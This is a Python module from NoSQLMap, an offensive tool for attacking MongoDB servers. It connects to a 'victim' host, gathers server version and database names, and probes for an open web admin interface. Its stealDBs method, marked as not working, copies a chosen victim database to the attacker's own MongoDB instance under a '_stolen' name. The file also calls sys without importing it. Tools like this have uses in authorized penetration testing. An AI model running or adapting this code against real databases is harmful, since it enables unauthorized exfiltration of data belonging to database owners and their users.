#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

from pymongo import MongoClient
import pymongo.errors as mongoError
from exceptions import MongoConnectionError,MinParametersViolation
import requests
from log import Logger

class MongoConnection:
    """
    Class for interacting with a mongoDB server.
    """ 
    
    def __init__(self, options):
        """
        Take as input an options object
        Set victim, username, password, target port etc in the object and test connection.
        Raise MongoConnectionError if connection is impossible.
        Raise MinParametersViolation if not enough parameters are set in options object.
        """

        if options.victim == "":
            raise MinParametersViolation
        self.username = options.mongoUn
        self.password = options.mongoPw
        self.target = options.victim
        self.port = options.mongoPort
        if self.username and self.password:
            self.uri = "mongodb://%s:%s@%s:%s/" % (self.username, self.password, self.target, self.port)
        else:
            self.uri = "mongodb://%s:%s/" % (self.target, self.port)
        try:
            self.conn = MongoClient(self.uri)
        except mongoError.ConnectionFailure:
            raise MongoConnectionError
        Logger.info("Connection established")

    def doSingleOperation(self, func):
        """
        Perform a single operation on a mongoDb database.
        Receives as input the name of the operation.
        Manages eventual reconnections
        Return the result from the operation provided.
        Raise MongoConnectionError if something went wrong
        """

        try:
            info = getattr(self.conn, func)()
        except mongoError.AutoReconnect:
            try:
                self.conn = MongoClient(self.uri)
                info = getattr(self.conn, func)()
            except mongoError.ConnectionFailure:
                raise MongoConnectionError
        except mongoError.ConnectionFailure:
            raise MongoConnectionError
        return info

    def getServerInfo(self):
        """
        ask server for interesting info (sysinfo, version, bits).
        Return a string with values requested.
        Call the function "server_info" using doSingleOperation
        """
        
        self.serverInfo = self.doSingleOperation("server_info")
        interestingData=["sysInfo","version","bits",]
        m="\n"
        for el in interestingData:
            if el == "sysInfo":
                m+= "Mongo Build Info: " + str(self.serverInfo["sysInfo"]) + "\n"
            
            elif el == "version":
                m+= "Mongo DB Version: " + str(self.serverInfo["version"]) + "\n"
            
            elif el == "bits":
                m+= "Platform: " + str(self.serverInfo["bits"]) + " bit\n"
        return m+"\n"
        
    def stealDBs(self, options):
        """
        TODO: function not working.
        Function able to steal databases from a mongoDB and copy them to the objective.
        1 - get the list of databases
        2 - asks for which database to steal
        3 - steal the db

        raise MinParametersViolation if destination ip or port are omitted, or if no victim is set
        """

        if options.myIP == "" or options.myPort == -1 or options.victim == "":
            raise MinParametersViolation

        if not hasattr(self, "dbList"):
            self.getDbList()
        m = "List of databases:"
        menuItem = 1
        dbDict = {}
        for dbName in self.dbList:
            m += "\n" + str(menuItem) + "-" + dbName
            dbDict[menuItem] = dbName
            menuItem += 1

        m += "\nType the number of the DB you want to steal: "
        choice = 0
        while choice not in dbDict:
            choice = int(Logger.logRequest(m))
            if choice not in dbDict:
                Logger.error("Invalid Parameter.")
        dbLoot = int(choice) - 1
        #Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.

        self.conn = MongoClient(options.myIP, 27017)
        
        try:
            self.conn.copy_database(self.dbList[dbLoot], self.dbList[dbLoot] + "_stolen", options.victim)
            m = "Database %s stolen!" % (self.dbList[dbLoot])
            Logger.success(m)

        except:
            if str(sys.exc_info()).index("text search not enabled") != -1:
                print "The database was cloned, but text indexing is not enabled on the destination.  Index not moved."
            
            else:
                print "Something went wrong.  Verify your MongoDB is running and the database does not already exist."

    def getDbList(self):
        """
        Take a database list by calling database_names function.
        Return a string including a list of dbs.
        """

        self.dbList = self.doSingleOperation("database_names")
        m = ""
        for el in self.dbList:
            m += "\n%s" %(el)
        return m + "\n"

    def getCollectionList(self, db):
        """
        TODO: NOT WORKING.
        Iterate on all the db, collecting collection_names and putting them in a list

        """
        self.collList=self.doSingleOperation("collection_names")
        m = ""
        for el in self.collList:
            m += "\n%s" %(el)
        return m + "\n"

class WebConnection:
    """
    Class used for connection to mongoDB if a web interface for DB is available.
    Right now is not doing anything,
    in the future maybe add a parser for the web interface.

    """
    def __init__(self,options):
        if options.victim == "":
            raise MinParametersViolation
        self.target = options.victim
        self.port = options.mongoWebPort
        self.uri = "http://%s:%s/" % (self.target, self.port)
        s = requests.get(self.uri)
        if s.status_code == 200:
            m = "MongoDB web management open at %s. Check this out!" % (self.uri)
            Logger.success(m)
